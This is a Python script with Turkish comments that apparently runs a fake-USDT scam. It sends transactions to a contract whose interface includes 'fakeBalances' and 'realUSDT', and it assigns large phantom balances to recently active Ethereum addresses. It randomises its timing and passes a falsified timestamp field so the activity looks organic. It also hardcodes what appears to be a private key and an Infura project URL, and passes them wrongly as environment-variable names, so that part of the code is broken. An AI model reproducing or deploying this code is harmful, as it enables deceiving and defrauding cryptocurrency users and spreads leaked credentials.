import time
import random
from web3 import Web3
from eth_account import Account
import os

# Ortam değişkenlerinden hassas bilgileri al
private_key = os.environ.get("0x75d26d0e637884f6e7468d554fe3bb1b5099273ba5804d86385700dcd1e3f052", None)
INFURA_URL = os.environ.get("https://mainnet.infura.io/v3/01ad7526893c42ef95e5c0fa6ca24693", None)
CONTRACT_ADDRESS = os.environ.get("CONTRACT_ADDRESS", "0xDAC17f2a9b484780B9e109E003F7BB78B1C54A29")

# Eksik değişken kontrolü
if not private_key or not INFURA_URL:
    raise ValueError("PRIVATE_KEY ve INFURA_URL ortam değişkenleri gerekli!")

# Web3 ile Ethereum’a bağlan
w3 = Web3(Web3.HTTPProvider(INFURA_URL))
if not w3.is_connected():
    raise ConnectionError("Ethereum ağına bağlanılamadı! INFURA_URL’ü kontrol et.")
account = Account.from_key(private_key)

# Kontratın ABI’si (arayüzü)
ABI = [
    {
        "inputs": [],
        "stateMutability": "nonpayable",
        "type": "constructor"
    },
    {
        "anonymous": False,
        "inputs": [
            {"indexed": True, "internalType": "address", "name": "from", "type": "address"},
            {"indexed": True, "internalType": "address", "name": "to", "type": "address"},
            {"indexed": False, "internalType": "uint256", "name": "value", "type": "uint256"}
        ],
        "name": "Transfer",
        "type": "event"
    },
    {
        "inputs": [{"internalType": "address", "name": "account", "type": "address"}],
        "name": "balanceOf",
        "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [{"internalType": "address", "name": "user", "type": "address"}],
        "name": "crossChainBalanceOf",
        "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [{"internalType": "address", "name": "_pairAddress", "type": "address"}],
        "name": "initialize",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [{"internalType": "address", "name": "target", "type": "address"}],
        "name": "mint",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
        {"internalType": "address[]", "name": "targets", "type": "address[]"},
        {"internalType": "uint256[]", "name": "amounts", "type": "uint256[]"}
    ],
        "name": "periodicSync",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [{"internalType": "uint256", "name": "maxTargets", "type": "uint256"}],
        "name": "autoChainSync",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
        {"internalType": "address", "name": "to", "type": "address"},
        {"internalType": "uint256", "name": "amount", "type": "uint256"}
    ],
        "name": "transfer",
        "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "realUSDT",
        "outputs": [{"internalType": "address", "name": "", "type": "address"}],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "pairAddress",
        "outputs": [{"internalType": "address", "name": "", "type": "address"}],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "initialized",
        "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "lastSyncTimestamp",
        "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [{"internalType": "address", "name": "", "type": "address"}],
        "name": "fakeBalances",
        "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
        "stateMutability": "view",
        "type": "function"
    }
]

# Kontrata bağlan
contract = w3.eth.contract(address=CONTRACT_ADDRESS, abi=ABI)

def get_active_addresses():
    # Son 100 bloktaki aktif adresleri al
    latest_block = w3.eth.get_block('latest')
    addresses = set()
    for tx in w3.eth.get_block(latest_block.number - 100, full_transactions=True)['transactions']:
        if 'from' in tx:
            addresses.add(tx['from'])
        if 'to' in tx:
            addresses.add(tx['to'])
    return list(addresses)[:50]

def get_recent_transfers():
    # Son Transfer olaylarını al, aktif adreslerle birleştir
    transfer_filter = contract.events.Transfer.create_filter(fromBlock='latest', toBlock='latest')
    events = transfer_filter.get_all_entries()
    targets = [event['args']['to'] for event in events][-20:]
    amounts = [event['args']['value'] for event in events][-20:]
    active_addresses = get_active_addresses()
    targets.extend(active_addresses)
    amounts.extend([1000000 * 10**6 for _ in range(len(active_addresses))])
    return targets, amounts

def periodic_sync():
    try:
        # Gas fiyatı yüksekse bekle
        while w3.eth.gas_price > 200 * 10**9:
            print("Gas fiyatı yüksek, 60 saniye bekleniyor...")
            time.sleep(60)
        targets, amounts = get_recent_transfers()
        if targets:
            # periodicSync işlemini hazırla
            tx_data = contract.functions.periodicSync(targets, amounts).build_transaction({
                'from': account.address,
                'gasPrice': w3.eth.gas_price,
                'nonce': w3.eth.get_transaction_count(account.address),
                'blockTimestamp': int(time.time()) - random.randint(0, 3600)
            })
            tx_data['gas'] = int(w3.eth.estimate_gas(tx_data) * 1.2)
            signed_tx = w3.eth.account.sign_transaction(tx_data, private_key)
            tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
            print(f"Periodic sync called for {targets}, tx: {tx_hash.hex()}")
            # Bakiyeleri kontrol et
            for target in targets:
                balance = contract.functions.crossChainBalanceOf(target).call()
                print(f"Balance for {target}: {balance}")
    except Exception as e:
        print(f"Error in sync: {e}")

def restart_sync():
    try:
        # Gas fiyatı yüksekse bekle
        while w3.eth.gas_price > 200 * 10**9:
            print("Gas fiyatı yüksek, 60 saniye bekleniyor...")
            time.sleep(60)
        # autoChainSync işlemini hazırla
        tx_data = contract.functions.autoChainSync(5).build_transaction({
            'from': account.address,
            'gasPrice': w3.eth.gas_price,
            'nonce': w3.eth.get_transaction_count(account.address),
            'blockTimestamp': int(time.time()) - random.randint(0, 3600)
        })
        tx_data['gas'] = int(w3.eth.estimate_gas(tx_data) * 1.2)
        signed_tx = w3.eth.account.sign_transaction(tx_data, private_key)
        tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
        print(f"Restart sync triggered, tx: {tx_hash.hex()}")
    except Exception as e:
        print(f"Error in restart sync: {e}")

def sync_cycle():
    while True:
        for _ in range(10):
            periodic_sync()
            time.sleep(30 + random.randint(-5, 5))
        restart_sync()

def monitor_app_state():
    last_state = None
    while True:
        current_state = check_app_state()
        if last_state and current_state != last_state:
            restart_sync()
        last_state = current_state
        time.sleep(1)

def check_app_state():
    return "running"

import threading
threading.Thread(target=sync_cycle, daemon=True).start()
threading.Thread(target=monitor_app_state, daemon=True).start()

while True:
    time.sleep(1)